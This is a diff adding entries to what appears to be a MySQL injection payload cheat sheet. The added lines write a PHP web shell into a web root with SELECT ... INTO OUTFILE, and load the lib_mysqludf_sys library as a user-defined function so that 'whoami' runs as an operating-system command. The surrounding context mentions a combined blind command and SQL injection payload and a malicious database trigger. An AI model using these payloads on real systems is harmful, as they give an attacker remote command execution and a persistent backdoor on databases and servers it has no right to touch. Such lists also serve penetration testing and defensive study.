@@ -18,6 +18,24 @@ Combines blind command injection and blind sql injection ( mysql ) in one payloa
 ```
 > https://mobile.twitter.com/bl4ckh4ck5/status/1100167033407320065
 
+WebShell over MySQL
+
+```
+SELECT '<?php echo shell_exec($_GET['c']); ?>' INTO OUTFILE '/var/www/html/example.php'
+```
+
+User Defined Functions (UDF) (sqlmap/udf/mysql)
+
+```
+SELECT @@plugin_dir;
+PowerShell$ Convert-Dll -DllPath lib_mysqludf_sys.dll -OutputPath bytes.txt
+SELECT CHAR(64,64,....) INTO OUTFILE '<@@plugin_dir>/lib_mysqludf_sys.dll' FIELDS ESCAPED BY '';
+CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll';
+SELECT sys_eval('whoami');
+```
+
+
+
 ## Techniques
 - Add a trigger to do a malicious action (price 0)
 
